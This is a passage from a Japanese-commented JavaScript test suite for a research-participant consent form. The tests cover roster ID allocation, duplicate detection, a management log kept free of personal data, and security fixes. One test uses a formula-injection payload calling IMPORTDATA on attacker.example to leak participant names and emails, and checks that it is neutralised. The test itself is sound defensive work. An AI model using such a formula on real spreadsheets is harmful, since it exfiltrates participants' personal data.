  //     ⚠️ これは **T-27 の予約トークン方式では成立しない前提**である ——
  //       ★ 新実装が最初に append するのは **`⏳O1-…`（P-ID ではない）**なので、
  //       ⚠️ 旧テストの複製は「トークンが 2 行」になるだけで、**P-ID の重複を作らない**。
  //       → ★ そのまま残すと「衝突を仕込んだつもりで何も仕込んでいない」空回りになる。
  //   ★ そこで **この検査が今も実在で発火する経路**に置き換えた:
  //     ⚠️ **既存参加者の経路**（`existing-pid`）は `o1AllocatePidRow_` を通らないので、
  //       ★ ロスターが既に同じ P-ID を 2 行持っていると**そのまま配ってしまう**。
  //       → ここを塞いでいるのが T-24 の検査である。
  //   ★ 新規採番側の衝突は §14 が別に撃つ（⚠️ `__onFlush` で割り込み append を仕込む）。
  const ctx = makeReadyCtx({
    roster: [
      ["P006", "既存", "old@example.com"],
      ["P007", "本人", "dup@example.com"],
      ["P007", "衝突した別人", "clash@example.com"], // ⚠️ 同じ P-ID の 2 行目
    ],
  });
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "本人",
      [ctx.Q_O1_EMAIL]: "dup@example.com", // ★ メール一致で P007 に着地する
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  push(
    "§11 T-24 ⚠️★★★ 同じ P-ID が 2 行あるとき受付メールを送らない（fail-closed）",
    ctx.__mails.length === 0,
    { mails: ctx.__mails.length }
  );
  push(
    "§11 T-24 ★ 重複した行番号と「研究者が決める」ことをログに出す",
    ctx.__logs.some((l) => l.indexOf("同じ P-ID が") >= 0) &&
      ctx.__logs.some((l) => l.indexOf("研究者が決めてください") >= 0),
    {}
  );
}

{
  // ⚠️★★ **検査そのものが失敗したとき（`null`）は送る**（★ decisions.md G-3 の分岐）。
  //   ⚠️ cross-review が「この分岐にケースが無い」と指摘したので足した（2026-08-29）。
  //   ★ 発番のあとにロスターが読めなくなった状況を、シートを差し替えて作る。
  const ctx = makeReadyCtx();
  const sheets = ctx.__sheets[ROSTER_ID];
  const orig = sheets["参加者ロスター"];
  let appended = false;
  const guard = Object.create(orig);
  guard.appendRow = (r) => {
    orig.appendRow(r);
    appended = true;
    delete sheets["参加者ロスター"]; // ⚠️ 以後 o1OpenRoster_ は null を返す
  };
  sheets["参加者ロスター"] = guard;
  ctx.onO1ConsentSubmit(
    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "unreadable@example.com" })
  );
  push(
    "§11 T-24 ★ 重複検査ができなかったときは**送る**（⚠️ 検査の失敗で被験者を止めない）",
    appended && ctx.__mails.length === 1,
    { appended, mails: ctx.__mails.length }
  );
  push(
    "§11 T-24 ★ そのとき「検査ができませんでした」をログに残す",
    ctx.__logs.some((l) => l.indexOf("重複検査ができませんでした") >= 0),
    {}
  );
}

{
  // ★ **陽性対照**: 重複が無ければ送る（⚠️ T-24 が常に止めているのではない）。
  const ctx = makeReadyCtx();
  ctx.onO1ConsentSubmit(
    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "solo@example.com" })
  );
  push("§11 T-24 ★ 陽性対照: 重複が無ければ送る", ctx.__mails.length === 1, {
    mails: ctx.__mails.length,
  });
}

{
  // ★ 読み取り専用の点検関数（⚠️ 配備直後に実物へ撃つためのもの）。
  const ok = makeReadyCtx();
  ok.checkO1RosterShape();
  const bad = makeReadyCtx({ rosterHeader: ["ID", "なまえ", "アドレス", "OS"] });
  bad.checkO1RosterShape();
  push(
    "§11 T-23 ★ checkO1RosterShape は正しいロスターを ✅ と言う",
    ok.__logs.some((l) => l.indexOf("ロスターの形は正しい") >= 0),
    {}
  );
  push(
    "§11 T-23 ★ checkO1RosterShape は形が違えば ⛔ と理由を言う",
    bad.__logs.some((l) => l.indexOf("ロスターの形が違います") >= 0),
    {}
  );
  push(
    "§11 T-23 ⚠️ 点検関数は**書き込まない**（★ 行が増えない）",
    ok.__sheets[ROSTER_ID]["参加者ロスター"].__rows.length === 1,
    { rows: ok.__sheets[ROSTER_ID]["参加者ロスター"].__rows.length }
  );
  push(
    "§11 T-23 ⚠️ 点検関数は PII（メール）をログに出さない",
    !ok.__logs.some((l) => l.indexOf("@") >= 0),
    {}
  );
}

{
  // ⚠️★★★ **数式インジェクション**（security-checker HIGH・2026-08-29）。
  //   ★ 氏名欄は被験者の自由記入で、フォーム URL は配られる。⚠️ `=IMPORTDATA(...)` を
  //     ロスターへ素で書くと、**研究者が開いた瞬間に全参加者の氏名とメールが外部へ出る**。
  const attack = '=IMPORTDATA("https://attacker.example/x?d="&TEXTJOIN(",",1,B2:C200))';
  const ctx = makeReadyCtx();
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: attack,
      [ctx.Q_O1_EMAIL]: "attacker@example.com",
      [ctx.Q_O1_OS]: "Windows",
    })
  );
  const written = roster.__rows[1] && String(roster.__rows[1][1]);
  push(
    "§11 ⚠️★★★ 氏名の数式インジェクションを無害化してから書く",
    !!written && written.charAt(0) === "'" && written.indexOf("IMPORTDATA") > 0,
    { head: written && written.slice(0, 12) }
  );
  push(
    "§11 ★ 陰性対照: ふつうの氏名には印を付けない",
    ctx.o1PlainText_("三浦 太郎") === "三浦 太郎",
    { got: ctx.o1PlainText_("三浦 太郎") }
  );
  ["=x", "+x", "-x", "@x"].forEach((bad) => {
    push(`§11 ★ 先頭 "${bad.charAt(0)}" も無害化する`, ctx.o1PlainText_(bad).charAt(0) === "'", {
      got: ctx.o1PlainText_(bad),
    });
  });
}

{
  // ⚠️★★★ **古いほうの管理シートは「形が合っていても」拒否する**
  //   （security-checker MEDIUM・2026-08-29）。★ 旧シートは同じ見出しと P-ID の行を持つ。
  const ctx = makeReadyCtx();
  ctx.__props.PHASE1_MGMT_SHEET_ID = "12T8WU4D-OLD-SHEET-STUB";
  ctx.__sheets["12T8WU4D-OLD-SHEET-STUB"] = ctx.__sheets[ROSTER_ID]; // ★ 形は正しい
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "x@example.com" })
  );
  push(
    "§11 ⚠️★★★ 古い管理シートには書き込まない（★ 形の検査では止まらない）",
    roster.__rows.length === 1 && ctx.__mails.length === 0,
    { rows: roster.__rows.length, mails: ctx.__mails.length }
  );
  const insp = makeReadyCtx();
  insp.__props.PHASE1_MGMT_SHEET_ID = "12T8WU4D-OLD-SHEET-STUB";
  insp.__sheets["12T8WU4D-OLD-SHEET-STUB"] = insp.__sheets[ROSTER_ID];
  insp.checkO1RosterShape();
  push(
    "§11 ⚠️ 点検関数も古い管理シートを ✅ と言わない",
    insp.__logs.some((l) => l.indexOf("古いほうの管理シート") >= 0) &&
      !insp.__logs.some((l) => l.indexOf("ロスターの形は正しい") >= 0),
    {}
  );
}

{
  // ⚠️★ 「書き込まない」を**行数だけ**で測っていた（security-checker LOW）。
  //   ★ 既存セルへの `setValue` が足されても緑のままだった。→ **呼ばれたら throw** で撃つ。
  const ctx = makeReadyCtx();
  const sheet = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  const origRange = sheet.getRange;
  sheet.appendRow = () => {
    throw new Error("点検関数が appendRow を呼んだ");
  };
  sheet.getRange = (...args) => {
    const r = origRange(...args);
    if (r.setValue) r.setValue = () => {
      throw new Error("点検関数が setValue を呼んだ");
    };
    return r;
  };
  let threw = null;
  try {
    ctx.checkO1RosterShape();
  } catch (e) {
    threw = String(e.message);
  }
  push("§11 T-23 ⚠️ 点検関数は書き込み系メソッドを 1 度も呼ばない", threw === null, { threw });
}

{
  // ⚠️★★ **2 か所に同じ定数を持っている**ので、ずれたら赤にする。
  //   ★ `O1_ROSTER_HEAD` は Phase1 の `ROSTER_HEADER` の**先頭 4 列**でなければならない。
  const phase1 = fs.readFileSync(
    path.join(__dirname, "..", "Form_Phase1", "GSE_Phase1_Form_Builder.gs"),
    "utf8"
  );
  const m = phase1.match(/var\s+ROSTER_HEADER\s*=\s*\[([\s\S]{0,600}?)\]/);
  const items = m ? [...m[1].matchAll(/"([^"]{1,30})"/g)].map((x) => x[1]) : [];
  const head4 = items.slice(0, 4);
  push(
    "§11 ★ O1_ROSTER_HEAD が Phase1 の ROSTER_HEADER 先頭 4 列と一致する",
    items.length === 14 && JSON.stringify(head4) === JSON.stringify(ROSTER_HEAD_4),
    { phase1Head4: head4, o1: ROSTER_HEAD_4, total: items.length }
  );
  push(
    "§11 ★ .gs 側の O1_ROSTER_HEAD も同じ 4 列である",
    JSON.stringify(makeReadyCtx().O1_ROSTER_HEAD) === JSON.stringify(ROSTER_HEAD_4),
    { gs: makeReadyCtx().O1_ROSTER_HEAD }
  );
}

// --- 出力 ---------------------------------------------------------------------
// ⚠️★ 末尾 1 行の書式は `o1_submit_guard_test.cjs` と**同一にする**
//   （`run.sh` / `check-o1-release-readiness.sh` が `^全 <N> ケース期待どおり$` を読む）。
// ============================================================
// §12 ⚠️★★★ 裸の行の乗っ取り（`bare-row-claim`）— 2026-09-03 に G1 から移植
//
// ⚠️ **この関数 `o1FindInPhase1Roster_` を呼ぶテストは 1 件も無かった**
//   （★ 129 ケース全部が緑なのに、当の関数は一度も実行されていなかった）。
//   → ★ 前セッションの教訓「テストが対象関数を一度も呼んでいなかった」の同型なので、
//     **直接呼ぶ**形で書く。
//
// ★ 守っている性質: `o1AssignParticipantId_()` 系が `appendRow([newPid])` で作る
//   **氏名もメールも空の行**を、その P-ID を申告しただけの第三者が取れてはならない。
//   ⚠️ ロスターは Phase1 / G1 / O1 で共用なので、被害は O1 に閉じない。
// ============================================================
{
  const ctx = makeCtx({});
  const find = (roster, opts) => ctx.o1FindInPhase1Roster_(makeSheet(roster), opts);

  // ⚠️ 乗っ取り: 裸の行（氏名もメールも空）を P-ID の申告だけで取ろうとする
  {
    const got = find([["P007", "", ""]], { pid: "P007" });
    push(
      "§12 ⚠️ 裸の行（氏名もメールも空）は申告 P-ID で取れない",
      !!(got && got.conflict && got.reason === "bare-row-claim"),
      got
    );
  }

  // ★ 陽性対照: 研究者が氏名を先に入れた行は**通る**
  //   ⚠️ これが通らないと「全部 conflict にしただけ」になり、検査が意味を失う。
  {
    const got = find([["P007", "山田太郎", ""]], { pid: "P007" });
    push(
      "§12 ★ 陽性対照: 氏名がある行は埋めてよい（正当な経路）",
      !!(got && !got.conflict && got.pid === "P007"),
      got
    );
  }

  // ⚠️ 別人のメールが入っている行を名乗る → conflict（reason つき）
  {
    const got = find([["P007", "山田太郎", "other@example.com"]], { pid: "P007" });
    push(
      "§12 ⚠️ 別人のメールが入る行を名乗ると conflict",
      !!(got && got.conflict && got.reason === "email-mismatch"),
      got
    );
  }

  // ★ 陽性対照: メール一致の経路は壊れていない（★ 申告 P-ID より優先される）
  {
    const got = find([["P007", "山田太郎", "me@example.com"]], {
      email: "me@example.com",
      pid: "P999",
    });
    push(
      "§12 ★ 陽性対照: メール一致が最優先で通る（申告 P-ID より強い）",
      !!(got && !got.conflict && got.pid === "P007"),
      got
    );
  }

  // ⚠️ 空のロスターでは何も返さない（★ 誤って conflict を返さない）
  {
    const got = find([], { pid: "P007" });
    push("§12 ★ 該当なしは null", got === null, { got });
  }
}

// ============================================================
// §13 ⚠️★★★ O1 の運用管理シート（★ 提出イベントの追記ログ・起票 T-25）
// ============================================================
// ★ ここで測るのは 3 つ:
//   1. ⚠️ **提出時は fail-open**（ログが書けなくても登録は通る）
//   2. ⚠️ **構築時は fail-closed**（設定が無ければ構築系が止まる）
//   3. ⚠️★★★ **ロスターを指したら書かない**（★ 2 か所採番の芽を摘む）
{
  // --- 1. 正常: 登録が通ると 1 行追記される（★ 陽性対照） ---
  const ctx = makeReadyCtx();
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "new@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  const log = ctx.__sheets[MGMT_ID][MGMT_TAB];
  const rows = log.__grid.slice(2); // ★ バナー + 見出しを除く
  push("§13 ★ 陽性対照: 登録が通ると登録ログに 1 行増える", rows.length === 1, {
    rows: rows.length,
  });
  push(
    "§13 ★ 追記された行は 種別/P-ID/結果/理由 を持つ",
    rows.length === 1 && rows[0][1] === "register" && rows[0][2] === "P007" &&
      rows[0][3] === "ok" && rows[0][4] === "new-pid",
    { row: rows[0] }
  );
  // ⚠️★★★ **氏名・メールが 1 文字も入っていない**（★ これが本節の眼目）。
  const flat = rows.map((r) => r.join(" ")).join(" ");
  push(
    "§13 ⚠️★★★ 登録ログに氏名もメールも入らない（★ PII を持たない）",
    flat.indexOf("@") < 0 && flat.indexOf("新規") < 0,
    { flat }
  );
  push("§13 ★ 登録ログの見出しは 6 列で氏名・メールの列が無い", ctx.O1_MGMT_HEAD.length === 6 &&
    ctx.O1_MGMT_HEAD.join("/").indexOf("メール") < 0 &&
    ctx.O1_MGMT_HEAD.join("/").indexOf("氏名") < 0, { head: ctx.O1_MGMT_HEAD });
}

{
  // --- 1b. 弾かれた提出も 1 行になる（★ 「なぜ弾かれたか」が残る） ---
  const ctx = makeReadyCtx();
  ctx.onO1ConsentSubmit(
    makeResponse({ [ctx.Q_O1_NAME]: "誰か", [ctx.Q_O1_EMAIL]: "", [ctx.Q_O1_OS]: "Mac" })
  );
  const rows = logRows(ctx, MGMT_REJECT_TAB);
  push(
    "§13 ★ メール空で弾かれた提出も blocked/no-email として残る（★ 却下タブ）",
    rows.length === 1 && rows[0][3] === "blocked" && rows[0][4] === "no-email",
    { row: rows[0] }
  );
  // ⚠️★★★ **却下は登録タブを汚さない**（★ これが分離の目的そのもの）。
  push("§13 ⚠️★★★ 却下行は登録タブに入らない", logRows(ctx).length === 0, {
    main: logRows(ctx).length,
  });
}

{
  // --- 2. 不在: ⚠️★★★ ログが書けなくても**登録は通る**（fail-open） ---
  //   ★ ここを取り違えると、⚠️ ログの不調で被験者が登録できなくなる。
  const ctx = makeReadyCtx({ noMgmtSheet: true });
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "new@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  push(
    "§13 ⚠️★★★ 登録ログの表が無くても受付メールは送られる（fail-open）",
    ctx.__mails.length === 1,
    { mails: ctx.__mails.length }
  );
  push(
    "§13 ★ 書けなかったことはログに残る（★ 黙って落とさない）",
    ctx.__logs.some((l) => l.indexOf("登録ログに書けませんでした") >= 0),
    {}
  );
}

{
  // --- 2b. プロパティ自体が空でも登録は通る（fail-open） ---
  const ctx = makeReadyCtx({ noMgmtProp: true, noMgmtSheet: true });
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "new@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  push(
    "§13 ⚠️ O1_MGMT_SHEET_ID が空でも受付メールは送られる（fail-open）",
    ctx.__mails.length === 1,
    { mails: ctx.__mails.length }
  );
  // ⚠️ 対して**構築時は止まる**（fail-closed）。★ 同じ設定で向きが逆であることを撃つ。
  push(
    "§13 ⚠️★★★ 同じ設定でも構築時は問題として報告される（fail-closed）",
    ctx.o1ConfigProblems_().some((p) => p.indexOf("O1_MGMT_SHEET_ID") >= 0),
    { problems: ctx.o1ConfigProblems_() }
  );
}

{
  // --- 3. 壊れ: ⚠️★★★ ロスターと同じ ID / ロスタータブを持つ表には書かない ---
  const same = makeReadyCtx({ mgmtSheetId: ROSTER_ID, noMgmtSheet: true });
  push(
    "§13 ⚠️★★★ 登録ログにロスターと同じ ID を指すと構築時に止まる",
    same.o1ConfigProblems_().some((p) => p.indexOf("同じ表") >= 0),
    { problems: same.o1ConfigProblems_() }
  );
  // ⚠️ 逆向き: ★ ロスター側も「同じ表」なら開かない（発番しない）。
  const both = makeReadyCtx({ mgmtSheetId: ROSTER_ID });
  both.onO1ConsentSubmit(
    makeResponse({
      [both.Q_O1_NAME]: "新規",
      [both.Q_O1_EMAIL]: "new@example.com",
      [both.Q_O1_OS]: "Mac",
    })
  );
  push(
    "§13 ⚠️★★★ 同じ表を指していると発番も送信もしない（逆向きのガード）",
    both.__mails.length === 0 &&
      both.__sheets[ROSTER_ID]["参加者ロスター"].__rows.length === 1,
    { mails: both.__mails.length },
  );
}

{
  // --- 3b. ⚠️★★★ 「参加者ロスター」タブを持つ表は登録ログにしない（★ T-23 の穴） ---
  //   ★ 拒否リストは**既知の古いシートしか弾けない**ので、
  //     ⚠️ 「O1 用のロスターを作った」型はここでしか捕まらない。
  const ctx = makeReadyCtx({ mgmtHasRoster: true });
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "new@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  const log = ctx.__sheets[MGMT_ID][MGMT_TAB];
  push(
    "§13 ⚠️★★★ 「参加者ロスター」タブを持つ表には 1 行も書かない",
    log.__grid.length === 2,
    { rows: log.__grid.length }
  );
  push(
    "§13 ★ そのとき理由をログに出す（★ 黙って諦めない）",
    ctx.__logs.some((l) => l.indexOf("「参加者ロスター」タブがあります") >= 0),
    {}
  );
  push(
    "§13 ★ 陰性対照: それでも登録そのものは通る（fail-open）",
    ctx.__mails.length === 1,
    { mails: ctx.__mails.length }
  );
  push(
    "§13 ⚠️ buildO1MgmtSheet もロスタータブを持つ表を拒む",
    attempt(() => ctx.buildO1MgmtSheet()).threw,
    {}
  );
}

{
  // --- 4. ⚠️ 上限に達したら**追記をやめる**（★ 消さない） ---
  const many = [];
  for (let i = 0; i < 5000; i++) many.push(["t", "register", "P" + i, "ok", "new-pid", ""]);
  const ctx = makeReadyCtx({ mgmtRows: many });
  const log = ctx.__sheets[MGMT_ID][MGMT_TAB];
  const before = log.__grid.length;
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "new@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  push("§13 ⚠️ 上限を超えたら追記しない（★ 行が増えない）", log.__grid.length === before, {
    before,
    after: log.__grid.length,
  });
  push(
    "§13 ⚠️★ **消さない**（★ 既存の行がそのまま残る）",
    log.__grid.length >= 5002,
    { rows: log.__grid.length }
  );
  push(
    "§13 ★ 陰性対照: 上限でも登録そのものは通る（fail-open）",
    ctx.__mails.length === 1,
    { mails: ctx.__mails.length }
  );
}

{
  // --- 5. ⚠️★★★ 備考に `@` が来たら伏せる（★ PII 混入の機械的な歯止め） ---
  const ctx = makeReadyCtx();
  push("§13 ⚠️★★★ `@` を含む値は伏せて書く", ctx.o1MgmtSafeCell_("a@b.com") === "***", {
    got: ctx.o1MgmtSafeCell_("a@b.com"),
  });
  push("§13 ★ 陰性対照: ふつうの値はそのまま", ctx.o1MgmtSafeCell_("行 7 / OS: Mac") === "行 7 / OS: Mac", {
    got: ctx.o1MgmtSafeCell_("行 7 / OS: Mac"),
  });
  // ⚠️★★ 許可リストなので `=X` は**そもそも書かれない**（★ 拒否リスト時代は `'=X` だった）。
  push("§13 ⚠️ 数式に見える値は許可リストで弾かれる", ctx.o1MgmtSafeCell_("=X") === "***", {
    got: ctx.o1MgmtSafeCell_("=X"),
  });
  // ★ 許可された文字で始まる数式（`-` は許可リストに入っている）は `o1PlainText_` が潰す。
  //   ⚠️ ここが陽性対照: **許可リストを抜けても数式化しない**という二重化を測る。
  push("§13 ★ 許可された値でも先頭 `-` は無害化される", ctx.o1MgmtSafeCell_("-1 行") === "'-1 行", {
    got: ctx.o1MgmtSafeCell_("-1 行"),
  });
  // ⚠️★★★ **`@` を含まない PII が素通りしない**（★ 拒否リスト時代の穴）。
  push("§13 ⚠️★★★ 日本語の氏名は伏せられる（★ `@` を含まなくても）",
    ctx.o1MgmtSafeCell_("三浦 太郎") === "***", { got: ctx.o1MgmtSafeCell_("三浦 太郎") });
  push("§13 ⚠️ 電話番号形式も伏せられない/伏せられるを実測",
    ctx.o1MgmtSafeCell_("090-1234-5678") === "090-1234-5678", {
      got: ctx.o1MgmtSafeCell_("090-1234-5678"),
      注: "★ 数字とハイフンは許可（行番号と区別できない）。⚠️ 呼び出し側で渡さないこと",
    });
  // ⚠️★ 「弾かれた理由」に自由記入の P-ID を混ぜていないこと（★ bad-pid-format）。
  const c2 = makeReadyCtx();
  c2.onO1ConsentSubmit(
    makeResponse({
      [c2.Q_O1_NAME]: "誰か",
      [c2.Q_O1_EMAIL]: "x@example.com",
      [c2.Q_O1_PID]: "=IMPORTDATA(1)",
      [c2.Q_O1_OS]: "Mac",
    })
  );
  const r2 = logRows(c2, MGMT_REJECT_TAB);
  push(
    "§13 ⚠️ 自由記入の申告 P-ID を登録ログに書かない",
    r2.length === 1 && r2[0][2] === "" && r2[0][4] === "bad-pid-format",
    { row: r2[0] }
  );
}

// ============================================================
// §14 ⚠️★★★ ロスター内のメール重複（★ 起票 T-26）
// ============================================================
// ★ 眼目: **P-ID 重複と同じ扱いにする**（⚠️ 旧実装は先頭行を黙って採用していた）。
{
  const find = (rows, opts) =>
    makeReadyCtx().o1FindInPhase1Roster_(makeSheet(rows), opts);
  const got = find(
    [
      ["P006", "本人", "dup@example.com"],
      ["P007", "本人（別経路）", "dup@example.com"],
    ],
    { email: "dup@example.com" }
  );
  push(
    "§14 ⚠️★★★ 同じメールが 2 行あると conflict（★ 先頭行を黙って採らない）",
    got && got.conflict === true && got.reason === "dup-email-in-roster",
    { got }
  );
  push("§14 ★ 重複した行番号を全部返す", got && String(got.rows) === "3,4", { rows: got.rows });
  const ok = find(
    [
      ["P006", "本人", "dup@example.com"],
      ["P007", "別人", "other@example.com"],
    ],
    { email: "dup@example.com" }
  );
  push("§14 ★ 陰性対照: 1 行しか無ければ従来どおり通る", ok && ok.pid === "P006", { ok });
  // ⚠️ 大小文字は同一視する（★ 見逃すと重複を「別のメール」と読む）。
  const upper = find(
    [
      ["P006", "本人", "Dup@Example.com"],
      ["P007", "本人", "dup@example.com"],
    ],
    { email: "DUP@EXAMPLE.COM" }
  );
  push("§14 ★ 大小文字を同一視して重複と見なす", upper && upper.conflict === true, { upper });
}

{
  // ⚠️★★★ 提出経路でも**発番も送信もしない**（★ 検知するだけで通してはいけない）。
  const ctx = makeReadyCtx({
    roster: [
      ["P006", "本人", "dup@example.com"],
      ["P007", "本人（別経路）", "dup@example.com"],
    ],
  });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "本人",
      [ctx.Q_O1_EMAIL]: "dup@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  push(
    "§14 ⚠️★★★ メール重複では発番も送信もしない",
    ctx.__mails.length === 0 && roster.__rows.length === 2,
    { mails: ctx.__mails.length, rows: roster.__rows.length }
  );
  // ⚠️★★ **文面が理由に合っていること**（★ 旧実装は「別のメールが登録されています」固定だった）。
  push(
    "§14 ⚠️★★ 文面が「同じメールが N 行」と言う（★ 嘘の指示を出さない）",
    ctx.__logs.some((l) => l.indexOf("同じメールアドレスがロスターに 2 行あります") >= 0),
    {}
  );
  push(
    "§14 ⚠️ そのとき「別のメールアドレスが登録されています」とは言わない",
    !ctx.__logs.some((l) => l.indexOf("別のメールアドレスが登録されています") >= 0),
    {}
  );
  push(
    "§14 ★ 却下ログに理由が残る",
    logRows(ctx, MGMT_REJECT_TAB).some(
      (r) => r[3] === "blocked" && r[4] === "dup-email-in-roster"
    ),
    { rows: logRows(ctx, MGMT_REJECT_TAB) }
  );
}

{
  // ⚠️ 理由ごとに文面が変わることを、★ 他の 2 理由でも撃つ（★ 1 つだけだと固定文と区別できない）。
  const bare = makeReadyCtx({ roster: [["P006", "既存", "old@example.com"], ["P007", "", ""]] });
  bare.onO1ConsentSubmit(
    makeResponse({
      [bare.Q_O1_NAME]: "第三者",
      [bare.Q_O1_EMAIL]: "attacker@example.com",
      [bare.Q_O1_PID]: "P007",
      [bare.Q_O1_OS]: "Mac",
    })
  );
  push(
    "§14 ★ bare-row-claim では「氏名もメールも空」と言う",
    bare.__logs.some((l) => l.indexOf("**氏名もメールも空**") >= 0),
    {}
  );
  // ⚠️ 有効な P-ID の行を 1 つ残す（★ 無いと `o1RosterShapeProblem_` が**手前で**止めてしまい、
  //   ★ 「文面の検査を書いたのに、そこまで到達していない」空回りになる）。
  const bad = makeReadyCtx({
    roster: [
      ["P006", "既存", "old@example.com"],
      ["⏳O1-DEADBEEF", "採番中に中断", "x@example.com"],
    ],
  });
  bad.onO1ConsentSubmit(
    makeResponse({
      [bad.Q_O1_NAME]: "誰か",
      [bad.Q_O1_EMAIL]: "x@example.com",
      [bad.Q_O1_OS]: "Mac",
    })
  );
  push(
    "§14 ★ invalid-pid-in-roster では「P-ID の形をしていません」と言う",
    bad.__logs.some((l) => l.indexOf("**P-ID の形をしていません**") >= 0),
    {}
  );
}

// ============================================================
// §15 ⚠️★★★ 予約トークン方式の採番（★ 起票 T-27）
// ============================================================
// ★ 眼目: ⚠️ **他プロジェクトが同じ番号を取ったら、自分が譲って採番し直す**。
{
  // --- 1. 陽性対照: 衝突が無ければ従来と同じ P-ID が出る ---
  const ctx = makeReadyCtx({ roster: [["P006", "既存", "old@example.com"]] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "new@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  push("§15 ★ 陽性対照: 衝突が無ければ P007 が出る", roster.__rows[1][0] === "P007", {
    rows: roster.__rows,
  });
  push("§15 ★ 予約トークンは残らない（★ 採番で置き換わる）",
    roster.__rows.every((r) => String(r[0]).indexOf("⏳") < 0), { rows: roster.__rows });
  push("§15 ★ 受付メールが送られる", ctx.__mails.length === 1, { mails: ctx.__mails.length });
}

{
  // --- 2. ⚠️★★★ 割り込み: 他プロジェクトが同じ番号を先に取る ---
  //   ★ `__onFlush` で「flush のたびに別プロジェクトが append する」状況を作る。
  //   ⚠️ 1 回だけ割り込ませる（★ 毎回だと永久に譲り続けて 3 回で諦めてしまう）。
  const ctx = makeReadyCtx({ roster: [["P006", "既存", "old@example.com"]] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  let fired = false;
  ctx.__onFlush = () => {
    // ★ O1 が P007 を書いた直後に、⚠️ 別プロジェクトが **同じ P007** を append する。
    if (fired) return;
    const hasP007 = roster.__rows.some((r) => String(r[0]) === "P007");
    if (!hasP007) return;
    fired = true;
    roster.appendRow(["P007", "G1 の被験者", "g1@example.com", "Win"]);
  };
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "new@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  const mine = roster.__rows.filter((r) => String(r[2]) === "new@example.com");
  push("§15 ⚠️★★★ 割り込まれたら**譲って採番し直す**（P007 → P008）",
    mine.length === 1 && mine[0][0] === "P008", { rows: roster.__rows });
  push("§15 ⚠️ 相手の行は書き換えない（★ P007 は G1 の被験者のまま）",
    roster.__rows.filter((r) => String(r[0]) === "P007").length === 1 &&
      roster.__rows.some((r) => String(r[0]) === "P007" && String(r[2]) === "g1@example.com"),
    { rows: roster.__rows });
  push("§15 ★ 譲ったことをログに残す",
    ctx.__logs.some((l) => l.indexOf("が重複したので譲りました") >= 0), {});
  push("§15 ★ 被験者には**新しい ID で**受付メールが届く",
    ctx.__mails.length === 1 && ctx.__mails[0].body.indexOf("P008") >= 0,
    { mails: ctx.__mails.length });
  push("§15 ★ 登録ログには最終的な P-ID が残る",
    logRows(ctx).some((r) => r[2] === "P008" && r[3] === "ok"),
    { rows: logRows(ctx) });
}

{
  // --- 3. ⚠️ 毎回割り込まれたら**諦めて配らない**（★ 無限に粘らない） ---
  const ctx = makeReadyCtx({ roster: [["P006", "既存", "old@example.com"]] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  let busy = false;
  ctx.__onFlush = () => {
    if (busy) return; // ★ append が flush を呼ばないので再入はしないが、念のため
    busy = true;
    const mine = roster.__rows.filter((r) => String(r[2]) === "new@example.com");
    const p = mine.length ? String(mine[0][0]) : "";
    if (/^P\d+$/.test(p) && roster.__rows.filter((r) => String(r[0]) === p).length === 1) {
      roster.appendRow([p, "しつこい別プロジェクト", "x" + roster.__rows.length + "@e.com", ""]);
    }
    busy = false;
  };
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "new@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  push("§15 ⚠️★★★ 毎回衝突したら受付メールを送らない", ctx.__mails.length === 0, {
    mails: ctx.__mails.length,
  });
  push(
    "§15 ⚠️ 自分の行は `⏳O1-` のまま残す（★ どの採番にも混ざらない）",
    roster.__rows.some((r) => String(r[0]).indexOf("⏳O1-") === 0),
    { rows: roster.__rows.map((r) => r[0]) }
  );
  push(
    "§15 ★ 研究者向けの直し方をログに出す",
    ctx.__logs.some((l) => l.indexOf("回とも採番が重複しました") >= 0),
    {}
  );
  push(
    "§15 ★ 却下ログに reserve-failed が残る",
    logRows(ctx, MGMT_REJECT_TAB).some((r) => r[4] === "reserve-failed"),
    { rows: logRows(ctx, MGMT_REJECT_TAB) }
  );
}

{
